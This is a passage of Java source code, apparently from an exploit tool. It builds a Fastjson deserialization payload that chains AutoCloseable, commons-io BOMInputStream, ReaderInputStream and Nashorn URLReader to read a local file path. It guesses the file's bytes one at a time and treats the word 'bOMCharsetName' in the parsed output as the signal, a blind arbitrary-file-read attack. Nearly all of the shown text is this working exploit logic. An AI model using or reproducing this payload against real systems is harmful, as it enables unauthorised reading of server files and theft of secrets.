            String payload_read_file = "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"C:/repos/burp/plugins/\"},\"charsetName\": \"utf-8\",\"bufferSize\": 1024},\"boms\": [{\"charsetName\": \"utf-8\",\"bytes\": ["+formatChars(fs)+"]}]},\"address\": {\"$ref\": \"$.abc.BOM\"}}";
            if (JSON.parse(payload_read_file).toString().indexOf("bOMCharsetName")>0){
                return i;
            }
        }
        return 0;
    }

    private static String formatChars(char[] fs) {
        StringBuilder builder = new StringBuilder();
        for(int i = 0; i< fs.length; i++){
//            System.out.println(Integer.toHexString(fs[i]));    // 将每个字符转换成一个int
            builder.append(Integer.toHexString(fs[i]));
            builder.append(", ");
        }


        return builder.toString();
    }



}
